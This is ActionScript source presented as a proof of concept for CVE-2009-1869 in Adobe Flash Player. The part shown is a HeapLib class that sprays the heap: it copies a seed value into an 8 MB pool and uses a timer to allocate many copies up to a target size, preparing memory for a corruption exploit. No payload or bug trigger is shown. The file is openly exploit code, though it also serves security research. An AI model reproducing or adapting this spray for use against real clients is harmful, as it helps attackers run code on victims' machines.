// PoC for CVE-2009-1869, for educational purposes only
// Created by Roee Hay - roeehay@gmail.com

package
{
	import flash.utils.ByteArray;
	import flash.events.Event;
	import flash.events.TimerEvent;
	import flash.utils.Timer;

	
	class HeapLib
	{
		static const POOL_SIZE:int = 0x800000;

		static var allocs:Array;		
		static var pool:ByteArray;
		static var dstSize:int;
		static var allocCount:int;
		static var cevent:Function;
		static var remainder:int;
		
		public static function init_pool(val)
		{
			pool = new ByteArray();
			pool.writeBytes(val);
			
			while (pool.length < POOL_SIZE)
			{
				var temp:ByteArray = new ByteArray();
				temp.writeBytes(pool);
				pool.writeBytes(temp);			
			}
		}

		public static function alloc_event(evt:Event):void {
			var block:ByteArray = new ByteArray();
			block.writeBytes(pool);
			allocs.push(block);
		}
		public static function remainder_event(evt:Event):void {
			var block:ByteArray = new ByteArray();
			block.writeBytes(pool, 0, remainder);
			allocs.push(block);
			cevent(evt);
		}

		public static function alloc(val, size, complete_event) {
			if (null == allocs)
				allocs = new Array();
				
			dstSize = size;
			cevent = complete_event
			remainder = dstSize % POOL_SIZE
		
			init_pool(val);
					
			var timer:Timer = new Timer(2, dstSize / POOL_SIZE);
			timer.addEventListener(TimerEvent.TIMER, alloc_event);
			
			if (0!=remainder)
				timer.addEventListener(TimerEvent.TIMER_COMPLETE, remainder_event);
			else
				timer.addEventListener(TimerEvent.TIMER_COMPLETE, complete_event);
				
			timer.start();	
		}

		public static function free() {
			allocs = null;
		}
	}
}